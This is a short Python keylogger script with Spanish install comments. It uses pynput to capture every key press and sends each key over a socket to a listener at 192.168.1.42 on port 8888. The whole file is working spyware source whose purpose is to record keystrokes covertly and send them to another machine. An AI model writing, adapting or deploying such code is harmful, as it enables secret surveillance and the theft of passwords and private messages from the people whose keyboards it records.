import datetime
import socket
from pynput.keyboard import Key, Listener

def key_recorder(key):
    mi_socket = socket.socket()
    mi_socket.connect(('192.168.1.42', 8888))
    mensaje = str(key)
    mi_socket.send(str.encode(mensaje))
    mi_socket.close()
    




with Listener(on_press=key_recorder) as l:
    l.join()


#sudo apt install python3-pip // instalar pip para intalar pynput XD
#sudo pip install pynput